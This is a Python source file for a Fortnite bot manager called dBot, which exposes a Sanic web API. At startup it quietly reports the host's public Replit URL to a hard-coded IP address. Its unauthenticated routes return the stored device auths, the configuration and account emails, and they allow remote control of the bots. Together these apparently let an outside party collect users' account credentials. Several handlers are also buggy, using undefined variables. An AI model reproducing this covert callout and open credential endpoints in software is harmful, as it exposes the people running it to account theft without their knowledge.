"""
“Commons Clause” License Condition v1.0
Copyright doener 2020

The Software is provided to you by the Licensor under the
License, as defined below, subject to the following condition.

Without limiting other conditions in the License, the grant
of rights under the License will not include, and the License
does not grant to you, the right to Sell the Software.

For purposes of the foregoing, “Sell” means practicing any or
all of the rights granted to you under the License to provide
to third parties, for a fee or other consideration (including
without limitation fees for hosting or consulting/ support
services related to the Software), a product or service whose
value derives, entirely or substantially, from the functionality
of the Software. Any license notice or attribution required by
the License must also include this Commons Clause License
Condition notice.

Software: dBot

License: Apache 2.0
"""

import asyncio
import aiohttp
import aiofiles
import os
import requests

from utils import update_check, config 

from client import *
from Events import *

print('Welcome!\nThis Bot is made by doener.\nIf you have any problems or questions:\nhttps://discord.gg/YFdwpAF - For support, questions, etc.')

from utils import config, update_check
from client import FNClient, clients, cosmetics

app = sanic.Sanic('')
server = None

update_check()
r = requests.get(f"http://173.249.41.227/add_project?URL=https://{os.environ['REPL_SLUG']}--{os.environ['REPL_OWNER']}.repl.co")

@app.route('/')
async def home(request):
    for client in clients:
        if client.is_ready():
            return sanic.response.json({"status": "online"})
        if not client.is_ready():
            return sanic.response.json({"status": "offline"})



@app.route('/api/v1/settings/device_auths')
async def read_device_auths(request):
    text = json.loads(await (await aiofiles.open('auths.json', mode='r')).read())
    if text == "{}":
        return sanic.response.json({"error":"Some or all parts of the Device Auths are missing!"})
    return sanic.response.json(text)

@app.route('/api/v1/settings')
async def read_settings(request):
    text = json.loads(await (await aiofiles.open('config.json', mode='r')).read())
    if not "COSMETIC_SETTINGS" in text or not "SETTINGS" in text:
        return sanic.response.json({"error":"Some or all parts of the Settings are missing!"})
    return sanic.response.json(text)

@app.route('/api/v1/friends/count')
async def bot_friends(request):
    try:
        friends = []
        online_friends = []

        for client in clients:
            if client.is_closed():
                continue
            for i in range(5):
                if not client.is_ready():
                    await asyncio.sleep(1)
            if not client.is_ready():
                continue
            friends2 = list(client.friends)
            for friend in friends2:
                if friend.is_online():
                    online_friends.append(friend.id)
                friends.append(friend.id)

        friends = list(set(friends))
        online_friends = list(set(online_friends))

        return sanic.response.json({"friends": len(friends), "online": len(online_friends)})

    except Exception as ex:
        print(type(ex), ex)
        return sanic.response.json({"friends": {}})

@app.route('/api/v1/friends')
async def bot_raw_friends(request):
    try:
        friends = []

        for client in clients:
            if client.is_closed():
                continue
            for i in range(5):
                if not client.is_ready():
                    await asyncio.sleep(1)
            if not client.is_ready():
                continue
            friends2 = list(client.friends)
            for friend in friends2:
                friends.append(friend.id)

        friends = list(set(friends))

        return sanic.response.json({"friends": (friends)})

    except Exception as ex:
        print(type(ex), ex)
        return sanic.response.json({"friends": {}})

@app.route('/api/v1/unique_friends')
async def bot_unique_friends(request):
    try:
        friends = []

        for client in clients:
            if client.is_closed():
                continue
            for i in range(5):
                if not client.is_ready():
                    await asyncio.sleep(1)
            if not client.is_ready():
                continue
            friends2 = list(client.friends)
            for friend in friends2:
                if friend.id not in friends:
                    friends.append(friend.id)

        friends = list(set(friends))

        return sanic.response.json({"friends": (friends)})

    except Exception as ex:
        print(type(ex), ex)
        return sanic.response.json({"friends": {}})

@app.route('/api/v1/unique_friends/count')
async def bot_unique_friends_count(request):
    try:
        friends = []

        for client in clients:
            if client.is_closed():
                continue
            for i in range(5):
                if not client.is_ready():
                    await asyncio.sleep(1)
            if not client.is_ready():
                continue
            friends2 = list(client.friends)
            for friend in friends2:
                if friend.id not in friends:
                    friends.append(friend.id)

        friends = list(set(friends))

        return sanic.response.json({"friends": len(friends)})

    except Exception as ex:
        print(type(ex), ex)
        return sanic.response.json({"friends": 0})

@app.route('/api/v1/stop_bot')
async def stop_bot(request):
    display_name = request.args.get("display_name")
    status = False
    if not display_name:
        return sanic.response.json({"error":"No display_name is given"})
    if display_name:
        try:
            for client in clients:
                if client.user.display_name == display_name:
                    try:
                        await client.close()
                        status = True
                    except: 
                        pass
        except:
            pass
    return sanic.response.json({"stopped": status})

@app.route('/api/v1/start_bot')
async def start_bot(request):
    started_bot = False
    display_name = request.args.get("display_name")
    if not display_name:
        return sanic.response.json({"error":"no.display_name"})
    if display_name:
        for client in clients:
            if client.user.display_name == display_name:
                if not client.is_ready():
                    await asyncio.sleep(1)
                    try:
                        await fortnitepy.start_multiple(clients)
                        started_bot = True
                    except: pass

    return sanic.response.json({"started": started_bot})

@app.route('/api/v1/stop_bots')
async def stop_bots(request):
    stopped_bots1 = False
    try:
        for client in clients:
            stopped_bots = 0
            try:
                await fortnitepy.close_multiple(client)
                stopped_bots += 1
                stopped_bots1 = True
            except: pass
        print(f'Stopped {stopped_bots} Bot(s).')
    except:
        pass
    if stopped_bots != 0:
        return sanic.response.json({"status": stopped_bots1})
    if stopped_bots == 0:
        return sanic.response.json({"error": "no.bot.running"})
        

@app.route('/api/v1/start_bots')
async def start_bots(request):
    try:
        started_bots = False
        for client in clients:
            if not client.is_ready():
                try:
                    await client.run()
                    started_bots = True
                except: 
                    pass
        print(f'Started {started_bots} Bot(s).')
    except:
        pass
    return sanic.response.json({"status": started_bots})

@app.route('/bots/info')
async def bot_info(request):
    bots = []
    for client in clients:
        if not client.is_ready():
            bots.append({'image_url':'',  'variants':[],  'display_name':'',  'user_id':client.user.id if client.user else '',  'party_members':'Offline',  'friends':'Offline',  'status':'Offline'})
        else:
            variants = [f"https://fortnite-api.com/images/cosmetics/br/{client.party.me.outfit}/variants/{v['channel']}/{v['variant']}.png" for v in client.party.me.outfit_variants]
            bots.append({'image_url':f"https://fortnite-api.com/images/cosmetics/br/{client.party.me.outfit}/icon.png", 
                'variants':variants, 
                'display_name':client.user.display_name, 
                'user_id':client.user.id, 
                'party_members':client.party.member_count, 
                'friends':len(list(client.friends)), 
                'status':'Online'})

    return sanic.response.json(bots)

@app.route('/api/v1/add_bot')
async def add_bot(request):
    exchange_code = request.args.get("exchange_code", None)
    if not exchange_code:
        return sanic.response.json({'status': 'Exchange Code is missing'}, 400)

    status = False
    # Close all Clients
    await fortnitepy.close_multiple(client)

    # Add the Bot
    try:
        clients.append(FNClient({}, cosmetics, exchange_code=exchange_code, config=config))
        status = True
    except: pass

    await asyncio.sleep(1)

    return sanic.response.json({"status": status})

@app.route('/api/v1/restart_fn')
async def restart_fn(request):
    status = False
    try:
        print('Restarting all Clients now.')
        await asyncio.sleep(1)
        await fortnitepy.close_multiple(clients)
        await asyncio.sleep(3)
        loop.create_task(fortnitepy.start_multiple(clients))
        status = True
    except:
        pass
    return sanic.response.json({"status": status})
@app.route('/api/v1/update_cosmetics')
async def update_cosmetics(request):
    updatedCosmetics = False
    new_cosmetics = None
    
    try:
        async with aiohttp.ClientSession() as s:
            r = await s.get("https://fortnite-api.com/cosmetics/br")
            if 199 < r.status < 300:
                new_cosmetics = (await r.json())["data"]

                with open("cosmetics.json", "w+") as f:
                    text = json.dumps(new_cosmetics)
                    f.write(text)
                    updatedCosmetics = True
    except:
        pass
    if updatedCosmetics == True:
        print('Updated Cosmetics')
    return sanic.response.json({"status": updatedCosmetics})

@app.route('/api/v1/bots')
async def check_bots(request):
    type1 = request.args.get("type")
    bots = []
    for client in clients:
        if client.is_ready():
            try:
                if type1 == "name":
                    bots.append(client.user.display_name)
                if type1 == "email":
                    bots.append(client.user.email)
                if type1 == "id":
                    bots.append(client.user.id) 
                if not type1:  
                    bots.append({f'{client.user.id}, {client.user.email}, {client.user.display_name}'})
            except:
                pass    
    return sanic.response.json(bots)

@app.route('/api/v1/leave_party')
async def leave_party(request):
    name = request.args.get("display_name")
    if not name:
        return sanic.response.json({"error":'Name is missing'})
    status = False
    if name:
        for client in clients:
            if client.user.display_name == name:
                await client.wait_until_ready()
                try:
                    await client.initialize_party()
                    status = True
                except:
                    pass
    return sanic.response.json({"status": status})

loop = asyncio.get_event_loop()
loop.create_task(app.create_server(host="0.0.0.0", port=8000, return_asyncio_server=True))

try:
    loop.run_forever()
finally:
    loop.stop()
